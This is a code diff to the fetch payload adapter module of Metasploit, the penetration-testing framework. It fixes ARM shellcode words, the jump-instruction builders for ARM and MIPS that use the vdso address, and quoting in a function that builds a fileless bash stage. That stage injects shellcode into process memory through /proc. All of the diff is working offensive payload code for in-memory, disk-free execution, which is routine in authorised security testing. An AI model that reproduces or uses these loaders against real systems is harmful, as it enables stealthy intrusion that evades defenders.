@@ -369,7 +369,7 @@ module Msf::Payload::Adapter::Fetch
       # pause()
       in_memory_loader_asm = [
           0xe3a02000, #0x1000:	mov	r2, #0	0xe3a02000
-          0xe52d2004, #0x1004:	str	r2, [sp, #-4]!	0xe52d2004
+          0xe52d2000, #0x1004:	str	r2, [sp, #-0]	0xe52d2000
           0xe1a0000d, #0x1008:	mov	r0, sp	0xe1a0000d
           0xe3a01001, #0x100c:	mov	r1, #1	0xe3a01001
           0xe3a07083, #0x1010:	mov	r7, #0x83	0xe3a07083
@@ -491,9 +491,9 @@ module Msf::Payload::Adapter::Fetch
     when 'aarch64'
       %^"4000005800001fd6"$(echo $(printf %016x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')^
     when 'armle'
-      %^$(echo $(printf %04x $vdso_addr)  |  awk '{print substr($0,3,2)}')"7"$(echo $(printf %04x $vdso_addr)  |  awk '{print substr($0,2,1)}')"0"$(echo $(printf %04x $vdso_addr)  |  awk '{print substr($0,1,1)}')"e3"^
+      %^"e59f2008e12fff12"$(echo $(printf %04x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')^
     when 'armbe'
-      %^"e30"$(echo $(printf %04x $vdso_addr)  |  awk '{print substr($0,1,1)}')"7"$(echo $(printf %04x $vdso_addr)  |  awk '{print substr($0,2,1)}')""$(echo $(printf %04x $vdso_addr)  |  awk '{print substr($0,3,2)}')^
+      %^"08209fe512ff2fe1"$(echo $(printf %04x $vdso_addr))^
     when 'mipsle'
       %^$(echo (printf %04x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')"09340800200100000000"^
     when 'mipsbe'
@@ -516,7 +516,7 @@ module Msf::Payload::Adapter::Fetch
   def _generate_fileless_bash(get_file_cmd)
     stage_cmd = %<vdso_addr=$((0x$(grep -F "[vdso]" /proc/$$/maps | cut -d'-' -f1)));>
     stage_cmd << %(jmp=#{_generate_jmp_instruction};)
-    stage_cmd << "sc='#{_generate_first_stage_shellcode}';"
+    stage_cmd << %(sc='#{_generate_first_stage_shellcode}';)
     stage_cmd << %<jmp=$(printf $jmp | sed 's/\\([0-9A-F]\\{2\\}\\)/\\\\x\\1/gI');>
     stage_cmd << %<sc=$(printf $sc | sed 's/\\([0-9A-F]\\{2\\}\\)/\\\\x\\1/gI');>
     stage_cmd << 'read syscall_info < /proc/self/syscall;'
